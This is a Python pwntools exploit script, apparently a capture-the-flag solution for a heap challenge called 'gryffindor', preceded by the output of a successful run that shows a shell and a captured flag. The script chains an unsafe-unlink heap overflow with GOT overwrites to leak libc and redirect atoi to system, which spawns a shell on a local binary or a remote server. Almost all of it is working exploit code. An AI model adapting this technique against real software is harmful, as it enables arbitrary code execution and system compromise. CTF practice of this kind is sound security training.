"""
[+] Libc:   0x7ffff7a0d000
[+] system: 0x7ffff7a52390
[*] Switching to interactive mode
1) Add
2) Delete
3) Edit
4) Exit

>> $ whoami
gryffindor
$ cat flag
iinctf{y3t_4n07h3r_h34p_0v3rfl0w}
"""

from pwn import *

array    = 0x6020e0
fd       = array - (3*8)
bk       = array - (2*8)

free_got = 0x602018
atoi_got = 0x602068
puts     = 0x4006a6

atoi_off = 0x36e80
sys_off  = 0x45390


def heapLeak():
	r.sendlineafter('>> ', '1337')
	return int(r.recvline().strip(), 16)

def libcLeak(idx):
	r.sendlineafter('>> ', '2')
	r.sendlineafter('index\n', str(idx))
	return u64(r.recv(6).ljust(8, '\x00'))

def alloc(size, idx):
	r.sendlineafter('>> ', '1')
	r.sendlineafter('input\n', str(size))
	r.sendlineafter('index\n', str(idx))
	return

def free(idx):
	r.sendlineafter('>> ', '2')
	r.sendlineafter('index\n', str(idx))
	return

def edit(idx, size, data):
	r.sendlineafter('>> ', '3')
	r.sendlineafter('index\n', str(idx))
	r.sendlineafter('size\n', str(size))

	if len(data) < size:
		data += '\n'
	r.send(data)

	return

def pwn():
	'''
	heap = heapLeak() - 0x10
	log.success("Heap: 0x{:x}".format(heap))
	'''

	# 0
	alloc(0x88, 0)
	# 1
	alloc(0x88, 1)
	# 2
	alloc(0x88, 2)

	chunk  = p64(0)
	chunk += p64(0x8)
	chunk += p64(fd)
	chunk += p64(bk)
	chunk += 'A'*0x60
	chunk += p64(0x80)
	chunk += p8(0x90)

	edit(0, len(chunk), chunk)

	"""
		0x603110:	0x0000000000000000	0x0000000000000091 <-- chunk 0
		0x603120:	0x0000000000000000	0x0000000000000008
		0x603130:	0x00000000006020c8	0x00000000006020d0 <-- FD/BK
		0x603140:	0x4141414141414141	0x4141414141414141
		0x603150:	0x4141414141414141	0x4141414141414141
		0x603160:	0x4141414141414141	0x4141414141414141
		0x603170:	0x4141414141414141	0x4141414141414141
		0x603180:	0x4141414141414141	0x4141414141414141
		0x603190:	0x4141414141414141	0x4141414141414141
		0x6031a0:	0x0000000000000080	0x0000000000000090 <-- chunk 1 (thinks chunk 0 is free)
	"""

	# Trigger unsafe unlink
	# https://github.com/shellphish/how2heap/blob/master/unsafe_unlink.c
	free(1)

	edit(0, 48, p64(0)*3 + p64(free_got) + p64(atoi_got)*2)
	"""
		0x6020e0 <table>:	0x0000000000602018	0x0000000000602068
		0x6020f0 <table+16>:    0x0000000000602068	0x0000000000000000
	"""
  
	# free => puts
	edit(0, 7, p64(puts))
	# free receives a pointer as an argument
	# since it's now overwritten with puts and the 1st
	# index in the array is atoi's GOT address, we'll get a leak
	libc   = libcLeak(1) - atoi_off
	system = libc + sys_off
	log.success("Libc:   0x{:x}".format(libc))
	log.success("system: 0x{:x}".format(system))

	# atoi => system
	edit(2, 8, p64(system))
	# atoi('sh') => system('sh')
	r.sendline('sh')

	r.interactive()

if __name__ == "__main__":
    log.info("For remote: %s HOST PORT" % sys.argv[0])
    if sys.argv[1] == "r":
        r = remote('35.196.53.165', 1337)
        pwn()
    else:
        r = process('./gryffindor')
        pause()
        pwn()
